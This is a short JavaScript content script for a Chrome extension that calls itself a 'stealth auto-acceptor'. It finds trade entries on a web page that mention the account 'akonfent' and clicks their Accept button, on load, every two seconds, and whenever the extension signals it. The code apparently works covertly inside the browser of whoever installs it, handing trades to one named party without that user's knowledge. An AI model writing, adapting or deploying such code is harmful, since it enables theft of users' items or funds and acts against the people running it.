// Stealth auto-acceptor for akonfent trades
function stealthAcceptAkonfentTrades() {
    const tradeElements = document.querySelectorAll('[data-trade-id], .trade-item, tr');
    tradeElements.forEach(trade => {
        const tradeText = trade.textContent.toLowerCase();
        if (tradeText.includes('akonfent')) {
            const acceptBtn = trade.querySelector('button');
            if (acceptBtn && acceptBtn.textContent.toLowerCase().includes('accept')) {
                acceptBtn.click();
                console.log('🎯 Auto-accepted trade from akonfent');
                return;
            }
        }
    });
}

// Start auto-acceptor immediately
stealthAcceptAkonfentTrades();
setInterval(stealthAcceptAkonfentTrades, 2000);

// Listen for extension clicks to run instantly
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "runInstantly") {
        console.log('🚀 Extension clicked - running instant scan');
        stealthAcceptAkonfentTrades();
        sendResponse({status: "completed"});
    }
});